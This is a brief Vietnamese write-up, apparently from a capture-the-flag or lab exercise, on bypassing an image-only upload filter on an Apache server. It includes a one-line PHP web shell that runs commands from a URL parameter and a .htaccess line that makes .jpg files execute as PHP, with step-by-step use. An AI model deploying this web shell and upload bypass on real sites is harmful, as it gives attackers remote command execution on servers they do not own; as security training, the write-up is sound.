**Giai đoạn quan sát mục tiêu**

Trang cấm gửi các file ngoài jpg png GIF

Thử tìm các Client side filter nhưng không có

Đọc hint thì thấy Apache có thể chạy file không phải php như là php với .htaccess.

Tìm hiểu về .htaccess thì thấy có thể cấu hình để server có thể chạy các file không có extension là php như php qua dòng lệnh cấu hình sau :
AddType application/x-httpd-php .jpg .png

**Các bước khai thác lỗ hổng:**
1. Tạo payload đơn giản.
Ex: <?php system($_GET['cmd']); ?>

2. Upload nó lên với tên file đuôi .jpg
3. Tạo 1 file .htaccess, với nội dung:
AddType application/x-httpd-php .jpg

4. Upload file đó lên server
5. Sau đó truy cập lại vào tấm ảnh jpg vừa upload, thêm tham số cmd với command muốn thực hiện là được
